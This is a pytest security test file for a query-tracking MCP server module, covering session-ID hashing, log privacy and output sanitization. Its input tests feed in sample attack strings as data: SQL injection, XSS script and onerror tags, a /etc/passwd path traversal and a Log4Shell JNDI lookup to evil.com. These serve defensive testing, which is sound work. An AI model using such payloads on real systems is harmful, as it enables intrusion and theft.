"""
Security tests for Query Gamification System.

Tests session ID hashing, log privacy, input validation, query truncation,
error handling privacy, and output sanitization to verify NFR-S1.
"""

import logging
import re
from typing import List
from io import StringIO

import pytest

from mcp_server.core.prepend_generator import generate_query_prepend
from mcp_server.core.query_classifier import classify_query_angle
from mcp_server.core.query_tracker import get_tracker
from mcp_server.core.session_id_extractor import hash_session_id


@pytest.fixture(autouse=True)
def reset_tracker():
    """Reset tracker and session state before each test."""
    from mcp_server.core import session_id_extractor
    
    tracker = get_tracker()
    tracker._session_stats = {}  # pylint: disable=protected-access
    
    # Also reset session_id_extractor state
    session_id_extractor._session_states = {}  # pylint: disable=protected-access
    
    yield
    
    tracker._session_stats = {}  # pylint: disable=protected-access
    session_id_extractor._session_states = {}  # pylint: disable=protected-access


# --- Session ID Hashing Tests ---


def test_hash_session_id_produces_16_char_hex():
    """Test that hash_session_id() produces 16-character hex strings."""
    test_session_ids = [
        "client_123_session_456",
        "simple_id",
        "very_long_session_id_with_many_characters_12345678901234567890",
        "special!@#$%^&*()chars",
        "",
    ]
    
    for session_id in test_session_ids:
        hashed = hash_session_id(session_id)
        
        # Must be exactly 16 characters
        assert len(hashed) == 16, f"Hashed ID '{hashed}' is not 16 chars"
        
        # Must be hexadecimal (only 0-9, a-f)
        assert re.match(r'^[0-9a-f]{16}$', hashed), f"Hashed ID '{hashed}' is not valid hex"


def test_hash_session_id_deterministic():
    """Test that hashing is deterministic (same input → same hash)."""
    test_session_id = "test_session_deterministic"
    
    hashes: List[str] = []
    for _ in range(10):
        hashed = hash_session_id(test_session_id)
        hashes.append(hashed)
    
    # All hashes must be identical
    assert len(set(hashes)) == 1, f"Hashing is not deterministic: {set(hashes)}"
    
    # Different inputs produce different hashes
    hash1 = hash_session_id("session_1")
    hash2 = hash_session_id("session_2")
    assert hash1 != hash2, "Different inputs produced same hash"


def test_hash_session_id_collision_resistance():
    """Test that different session IDs produce different hashes."""
    session_ids = [
        f"session_{i}" for i in range(100)
    ]
    
    hashes = [hash_session_id(sid) for sid in session_ids]
    
    # No collisions expected for 100 different inputs
    assert len(set(hashes)) == len(hashes), f"Hash collisions detected: {len(set(hashes))} unique hashes for {len(hashes)} inputs"


# --- Log Privacy Tests ---


def test_log_privacy_no_plain_session_ids(caplog):
    """Test that logs contain only hashed session IDs, never plain text."""
    tracker = get_tracker()
    plain_session_id = "my_secret_session_id_12345"
    
    with caplog.at_level(logging.DEBUG):
        # Perform operations that might log session IDs
        tracker.record_query(plain_session_id, "Test query")
        generate_query_prepend(tracker, plain_session_id, "Test query")
    
    # Check all log messages
    for record in caplog.records:
        message = record.getMessage()
        
        # Plain session ID must NEVER appear in logs
        assert plain_session_id not in message, \
            f"Plain session ID found in log: {message}"
    
    # Hashed version is OK (if logging is enabled)
    hashed = hash_session_id(plain_session_id)
    # Just verify hashed version exists (if debug logging is on)


# --- Input Validation Tests ---


def test_empty_query_handled_safely():
    """Test that empty queries are handled safely (not rejected)."""
    tracker = get_tracker()
    session_id = "test_session"
    
    # Empty query should be handled gracefully
    tracker.record_query(session_id, "")
    stats = tracker.get_stats(session_id)
    
    # Should increment query count
    assert stats.total_queries == 1


def test_none_query_handled_safely():
    """Test that None queries are handled safely."""
    tracker = get_tracker()
    session_id = "test_session"
    
    # None query should be coerced to empty string or handled gracefully
    try:
        tracker.record_query(session_id, None)  # type: ignore
        stats = tracker.get_stats(session_id)
        # Should either work or raise TypeError (both are acceptable)
        assert stats.total_queries >= 0
    except (TypeError, AttributeError):
        # Acceptable: TypeError for None.lower() or .strip()
        pass


def test_long_query_truncated_safely():
    """Test that queries >10,000 chars are handled safely."""
    tracker = get_tracker()
    session_id = "test_session_long_query"
    
    # Create very long query (20,000 characters)
    long_query = "x" * 20000
    
    # Should not crash, may truncate internally
    initial_count = tracker.get_stats(session_id).total_queries
    tracker.record_query(session_id, long_query)
    stats = tracker.get_stats(session_id)
    
    # Verify query was recorded (count increased by 1)
    assert stats.total_queries == initial_count + 1
    
    # Generate prepend should also handle it
    prepend = generate_query_prepend(tracker, session_id, long_query)
    assert len(prepend) > 0


def test_special_characters_in_query():
    """Test that queries with special characters are handled safely."""
    tracker = get_tracker()
    session_id = "test_session"
    
    special_queries = [
        "SELECT * FROM users; DROP TABLE users;",  # SQL injection attempt
        "<script>alert('XSS')</script>",  # XSS attempt
        "../../etc/passwd",  # Path traversal attempt
        "'; DROP TABLE users; --",  # SQL injection
        "${jndi:ldap://evil.com/a}",  # Log4Shell attempt
        "\x00\x01\x02\x03",  # Null bytes
        "🔥💻🎉🚀",  # Emojis
    ]
    
    for query in special_queries:
        # Should handle without crashing
        tracker.record_query(session_id, query)
        classify_query_angle(query)
        generate_query_prepend(tracker, session_id, query)


# --- Error Handling Privacy Tests ---


def test_error_handling_no_implementation_details(caplog):
    """Test that errors don't leak implementation details."""
    from unittest.mock import patch
    
    tracker = get_tracker()
    session_id = "test_session"
    
    with caplog.at_level(logging.ERROR):
        # Force an error by mocking internal method
        with patch.object(tracker, '_session_stats', side_effect=RuntimeError("Internal error")):
            try:
                tracker.record_query(session_id, "Test query")
            except RuntimeError:
                pass
    
    # Check error logs don't expose sensitive implementation details
    for record in caplog.records:
        if record.levelno == logging.ERROR:
            message = record.getMessage().lower()
            
            # Should not contain file paths
            assert "/Users/" not in message or "mcp_server" in message  # Stack traces are OK
            
            # Should not contain internal variable names in user-facing messages
            # (This is a weak test, mainly checking that errors are logged, not exposed to user)


# --- Output Sanitization Tests ---


def test_prepend_output_is_plain_text():
    """Test that prepend output contains no HTML tags (XSS prevention)."""
    tracker = get_tracker()
    session_id = "test_session"
    
    # Try various queries, including malicious ones
    test_queries = [
        "What is validation?",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "</body></html><script>alert('XSS')</script>",
    ]
    
    for query in test_queries:
        tracker.record_query(session_id, query)
        prepend = generate_query_prepend(tracker, session_id, query)
        
        # Prepend must be plain text only (emojis OK, no HTML tags)
        assert "<script" not in prepend.lower(), f"HTML script tag found in prepend"
        assert "<img" not in prepend.lower(), f"HTML img tag found in prepend"
        assert "onerror" not in prepend.lower(), f"HTML event handler found in prepend"
        assert "</html>" not in prepend.lower(), f"HTML tag found in prepend"


def test_no_sql_injection_risk():
    """Test that there's no SQL injection risk (in-memory dict only)."""
    # This is a manual inspection test, but we can verify:
    # 1. No database imports
    # 2. No SQL-like operations
    
    from mcp_server.core import query_tracker, query_classifier, prepend_generator, session_id_extractor
    import inspect
    
    modules = [query_tracker, query_classifier, prepend_generator, session_id_extractor]
    
    for module in modules:
        source = inspect.getsource(module)
        
        # Check for database-related imports
        assert "import sqlite3" not in source.lower()
        assert "import psycopg2" not in source.lower()
        assert "import mysql" not in source.lower()
        assert "from sqlalchemy" not in source.lower()
        
        # Check for SQL-like operations
        assert "SELECT" not in source or "# SELECT" in source  # Allow in comments
        assert "INSERT" not in source or "# INSERT" in source
        assert "UPDATE" not in source or "# UPDATE" in source
        assert "DELETE" not in source or "# DELETE" in source


def test_prepend_content_escaping():
    """Test that user query content in suggestions is safe."""
    tracker = get_tracker()
    session_id = "test_session"
    
    # Query with potential injection
    malicious_query = "What is <script>alert('xss')</script> validation?"
    
    tracker.record_query(session_id, malicious_query)
    prepend = generate_query_prepend(tracker, session_id, malicious_query)
    
    # Even if query appears in prepend, it should be safe
    assert "<script>" not in prepend.lower()
    
    # Emojis and safe characters OK
    assert "🔍" in prepend  # Emoji is safe
    assert "Queries:" in prepend  # Normal text OK

